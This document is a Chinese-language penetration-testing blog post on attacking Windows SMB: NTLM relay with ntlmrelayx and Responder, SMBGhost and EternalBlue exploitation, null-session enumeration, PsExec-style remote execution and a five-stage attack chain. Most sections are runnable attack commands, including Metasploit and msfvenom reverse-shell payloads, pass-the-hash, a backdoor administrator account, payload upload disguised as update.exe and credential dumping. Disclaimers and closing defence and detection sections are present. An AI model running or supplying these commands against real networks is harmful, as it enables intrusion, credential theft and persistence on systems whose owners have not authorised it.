---
title: SMB协议攻击
date: 2025-07-05 08:00:00
tags:
  - 内网渗透
  - 渗透测试
categories: 渗透测试
---

## 前言

SMB（Server Message Block）协议是Windows网络中用于文件共享、打印机共享与命名管道通信的核心协议。因其长期存在的漏洞历史和广泛部署面，SMB始终是内网渗透的关键攻击面。本文系统介绍SMB签名检测、中继攻击、经典漏洞利用、远程执行及信息收集技术。

> **免责声明：** 本文所述技术仅供安全研究与授权测试使用，未经授权对他人系统进行渗透测试属于违法行为，作者不对任何滥用行为承担责任。

---

## 一、SMB协议基础与签名检测

SMB协议从SMB 1.0（Win2000/XP，漏洞最多）演进至SMB 3.1.1（Win10/2016，预认证完整性校验）。默认端口：`TCP 445`（SMB over TCP）、`TCP 139`（NetBIOS会话）、`UDP 137/138`（名称服务）。

### 签名机制

SMB签名验证数据包完整性与来源真实性。若签名未强制（状态为`enabled but not required`），攻击者可实施中继攻击。域控制器默认强制签名，域成员和工作组机器通常不强制。

```bash
# Nmap检测SMB2/3签名
nmap -p 445 --script smb2-security-mode 192.168.1.0/24

# CrackMapExec批量检测，输出可中继目标列表
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

---

## 二、SMB中继攻击

### 2.1 攻击原理

攻击者通过LLMNR/NBT-NS投毒或ARP欺骗劫持客户端流量，将NTLM认证实时中继至未强制签名的合法服务器，以受害者身份执行操作。条件：(1)可劫持流量；(2)目标未强制签名；(3)中继用户对目标具备管理员权限。

### 2.2 ntlmrelayx基础中继

```bash
# 中继至单目标 / 目标列表
python ntlmrelayx.py -t 192.168.1.10 -smb2support
python ntlmrelayx.py -tf relay_targets.txt -smb2support

# 执行命令 / dump SAM / 获取Socks代理
python ntlmrelayx.py -t 192.168.1.10 -c "whoami /all" -smb2support
python ntlmrelayx.py -t 192.168.1.10 -smb2support -sam
python ntlmrelayx.py -tf targets.txt -smb2support -socks
```

### 2.3 跨协议中继

NTLM认证不限于SMB，跨协议可扩大攻击面：

| 中继方向 | 攻击效果 |
|----------|----------|
| SMB → SMB | 文件读写、远程命令执行 |
| SMB → LDAP | ACL篡改、RBCD配置、域提权 |
| SMB → HTTP | 攻击OWA、ADFS、Exchange端点 |
| SMB → MSSQL | 数据库命令执行（xp_cmdshell） |

```bash
# SMB→LDAP中继(可达域提权)
python ntlmrelayx.py -t ldap://dc01.company.local --escalate-user attacker

# SMB→MSSQL中继
python ntlmrelayx.py -t mssql://sql01.company.local -q "EXEC xp_cmdshell 'whoami'"
```

### 2.4 配合Responder触发认证

```bash
# 编辑Responder.conf关闭内置SMB和HTTP(SMB=Off,HTTP=Off)，避免端口冲突
python Responder.py -I eth0 -v
# 受害者访问不存在的共享时，通过LLMNR/NBT-NS投毒获取NetNTLMv2哈希
```

### 2.5 防御

强制SMB签名（组策略：`Microsoft网络服务器:对通信进行数字签名(始终)`），启用LDAP签名与通道绑定，禁用LLMNR和NetBIOS-NS，特权账户加入Protected Users组。

---

## 三、SMBGhost (CVE-2020-0796)

### 3.1 漏洞概要

| 字段 | 值 |
|------|-----|
| CVE编号 | CVE-2020-0796 |
| 影响版本 | Windows 10 1903/1909, Server 2019/1903/1909 (Core) |
| 影响组件 | SMB 3.1.1 压缩功能 (`srv2.sys`) |
| 漏洞类型 | 整数溢出 → 堆缓冲区溢出 |
| CVSS | 10.0（严重） |

### 3.2 原理与检测

`srv2.sys`中`Srv2DecompressData`函数未正确校验偏移和长度字段，攻击者构造恶意压缩包使解压缩数据超出预期缓冲区，覆盖内核内存实现代码执行。

```bash
git clone https://github.com/ollypwn/SMBGhost.git
python SMBGhost/scanner.py 192.168.1.0/24            # 专用扫描器
crackmapexec smb 192.168.1.0/24 -M smbghost           # CME模块检测
```

### 3.3 LPE利用核心逻辑

```python
import socket, struct

def craft_malicious_compress_pkt(original_size, compressed_data, offset):
    """构造恶意SMB3压缩包:通过精心设置offset触发整数溢出"""
    smb2_header = b'\xfeSMB' + struct.pack('<H', 64)
    comp_hdr  = struct.pack('<I', 0x00000001)           # ProtocolId
    comp_hdr += struct.pack('<I', original_size)         # OriginalSize
    comp_hdr += struct.pack('<I', offset)                # offset触发溢出
    comp_hdr += struct.pack('<I', len(compressed_data))  # Size
    return smb2_header + comp_hdr + compressed_data
# 完整LPE需要内核地址泄漏+ROP，一般覆盖halpInterruptController
```

### 3.4 RCE利用与修复

RCE链：LZNT1信息泄漏→堆喷射控制NonPagedPool→覆盖函数指针→触发中断执行Shellcode。公开PoC：`https://github.com/chompie1337/SMBGhost_RCE_PoC.git`。

修复：安装KB4551762；临时禁用压缩：`reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v DisableCompression /t REG_DWORD /d 1 /f`

---

## 四、EternalBlue (MS17-010)

| 字段 | 值 |
|------|-----|
| 公告 | MS17-010 (CVE-2017-0143 至 0148) |
| 影响 | Windows Vista 至 Server 2016（未打补丁） |
| 来源 | Shadow Brokers泄露 |
| 案例 | WannaCry（2017.5全球爆发） |

### 4.1 原理

`srv.sys`中的`SrvOs2FeaListSizeToNt`错误计算`FEA_LIST`缓冲区大小，`SrvOs2FeaListToNt`将数据写入过小内核池缓冲区，溢出覆盖相邻内存劫持控制流。

### 4.2 扫描与利用

```bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24
# MSF模块: auxiliary/scanner/smb/smb_ms17_010
```

```ruby
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.10; set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.100; run
```

```bash
# 非MSF利用(worawit/MS17-010)
nasm -f bin eternalblue_kshellcode.asm -o sc_kernel.bin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o sc_user.bin
python eternalblue_exploit7.py 192.168.1.10 sc_kernel.bin sc_user.bin
```

> 注意：可能导致BSOD；Win10 v1703+默认移除SMBv1不受影响；多数公开exploit已被杀软收录。

### 4.3 防御

```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false
```

---

## 五、IPC$空会话枚举

`IPC$`是Windows默认隐藏共享，用于命名管道通信。通过空会话可在未认证情况下获取用户列表、组成员、共享列表、密码策略等关键信息。

```bash
enum4linux -a 192.168.1.10                    # 完整枚举
enum4linux -U 192.168.1.10                    # 用户列表
enum4linux -S 192.168.1.10                    # 共享(含C$/ADMIN$)
enum4linux -P 192.168.1.10                    # 密码策略

nmap -p 445 --script smb-enum-users,smb-enum-shares,smb-enum-groups 192.168.1.10

crackmapexec smb 192.168.1.10 -u '' -p '' --rid-brute   # RID循环枚举用户

# 匿名连接与列出共享
smbclient -N -L //192.168.1.10
net use \\192.168.1.10\IPC$ "" /u:""                    # Windows环境
```

可获取信息：用户列表、Domain Admins组、隐藏共享、OS版本及补丁级别、密码策略（最小长度/锁定阈值）、域信任关系等。

防御：组策略启用 `网络访问:限制对命名管道和共享的匿名访问`及 `不允许SAM账户和共享的匿名枚举`；注册表 `RestrictAnonymous=1`。

---

## 六、PsExec / SMBExec 远程执行

### 6.1 PsExec原理

PsExec通过SMB实现远程执行：(1)连接`ADMIN$`共享；(2)上传服务程序到`%SystemRoot%`；(3)通过`\\.\pipe\svcctl`创建临时服务执行命令；(4)执行后清理服务和文件。

```bash
# psexec.py — 交互式Shell / Pass-the-Hash
python psexec.py domain/user:pass@192.168.1.10
python psexec.py -hashes :ntlm_hash domain/Administrator@192.168.1.10

# smbexec.py — 更隐蔽(bat文件+服务，不直接上传exe)
python smbexec.py domain/user:pass@192.168.1.10
python smbexec.py -hashes :ntlm_hash administrator@192.168.1.10
```

对比：`smbexec.py`通过bat文件执行，不走直接上传exe路径，比`psexec.py`更隐蔽，适合EDR/AV严格环境；`psexec.py`直接管道I/O交互更好。

### 6.2 CrackMapExec远程执行

```bash
crackmapexec smb 192.168.1.10 -u Admin -p 'Pass' -x 'whoami'

# Pass-the-Hash批量执行
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'ntlm_hash' -x 'ipconfig'

# 添加后门并指定SMBExec模式
crackmapexec smb targets.txt -u Admin -p 'Pass' \
  -x 'net user backdoor P@ssw0rd /add && net localgroup Administrators backdoor /add'
crackmapexec smb 192.168.1.10 -u Admin -p 'Pass' --exec-method smbexec
```

### 6.3 补充：wmiexec.py（DCOM/WMI通道）

```bash
python wmiexec.py domain/user:pass@192.168.1.10
python wmiexec.py -hashes :ntlm_hash administrator@192.168.1.10
```

---

## 七、SMB共享枚举工具

```bash
# SMBMap — 枚举共享/下载/上传/执行
smbmap -H 192.168.1.10 -u Admin -p 'Pass' -R
smbmap -H 192.168.1.10 -u Admin -p 'Pass' --download 'Shared\confidential.xlsx'
smbmap -H 192.168.1.10 -u Admin -p 'Pass' --upload /tmp/payload.exe 'C$\Temp\update.exe'
smbmap -H 192.168.1.10 -u Admin -p 'Pass' -x 'whoami /all'

# CME Spider — 爬取共享文件
crackmapexec smb 192.168.1.10 -u Admin -p 'Pass' -M spider
crackmapexec smb 192.168.1.0/24 -u user -p 'pass' --pattern '.kdbx' --regex
```

### 综合自动化枚举脚本

```bash
#!/bin/bash
# smb_enum.sh — 快速全量SMB信息收集
TARGET=$1
echo "[*] 枚举目标: $TARGET"
nmap -p 139,445 --script smb-os-discovery,smb-protocols,smb2-security-mode \
    --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 "$TARGET"
enum4linux -a "$TARGET" 2>/dev/null
smbclient -N -L "//$TARGET" 2>/dev/null
```

---

## 八、综合攻击链

```bash
# 阶段1 — 信息收集：SMB主机发现、签名检测、漏洞扫描
nmap -p 139,445 192.168.1.0/24 -oN hosts_smb.txt -T4
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# 阶段2 — 凭证获取：Responder监听 + NetNTLMv2破解
python Responder.py -I eth0 -wrfv &
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

# 阶段3 — 中继攻击
python ntlmrelayx.py -tf relay_targets.txt -smb2support -socks

# 阶段4 — 横向移动
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2025!' --continue-on-success
python psexec.py -hashes :ntlm_hash administrator@192.168.1.10

# 阶段5 — 信息窃取
python secretsdump.py administrator@192.168.1.10
```

---

## 九、防御与检测

### 组策略与主机加固

```
计算机配置\安全设置\本地策略\安全选项:
1. Microsoft网络服务器:对通信进行数字签名(始终) = 已启用
2. Microsoft网络客户端:对通信进行数字签名(始终) = 已启用
3. LAN管理器身份验证级别 = 仅发送NTLMv2响应\拒绝LM和NTLM
4. 不允许SAM账户和共享的匿名枚举 = 已启用
5. 限制对命名管道和共享的匿名访问 = 已启用
```

```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false -EncryptData $true
reg add HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters /v EnableMulticast /t REG_DWORD /d 0 /f  # 禁用LLMNR
Set-NetAdapterBinding -Name "*" -ComponentID ms_netbios -Enabled $false    # 禁用NetBIOS
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f  # LSA保护
```
### 事件日志与Sysmon监控

| Event ID | 描述 | 场景 |
|----------|------|------|
| 4625 | 登录失败 | 暴力破解/密码喷洒 |
| 4776 | 凭据验证 | NTLM中继 |
| 5140/5145 | 网络共享访问 | 异常共享操作 |
| 4698/7045 | 计划任务/服务创建 | PsExec/SMBExec特征 |

```xml
<!-- Sysmon: 检测PSEXESVC服务及SMB出站 -->
<Rule groupRelation="or"><ServiceName condition="is">PSEXESVC</ServiceName></Rule>
<Rule><DestinationPort condition="is">445</DestinationPort><Initiated condition="is">true</Initiated></Rule>
```

---

## 十、总结

SMB协议攻击面覆盖信息收集、凭证获取、中继攻击到远程执行的完整杀伤链。核心要点：

- **签名未强制**是中继攻击的根本前提
- **PsExec/SMBExec**配合Pass-the-Hash是横向移动利器
- **跨协议中继**(SMB→LDAP)可实现域提权
- **MS17-010**与**CVE-2020-0796**在未打补丁环境中依然高危
- **空会话枚举**提供大量无需认证的情报信息
> **再次提醒：** 本文全部内容仅限授权安全测试与学术研究。在实际环境中应用相关技术前，务必取得书面授权并遵守法律法规。

---

## 参考资源

- [Microsoft SMB Protocol Documentation](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Responder](https://github.com/lgandx/Responder)
- [CVE-2020-0796 Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)
- [MS17-010 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
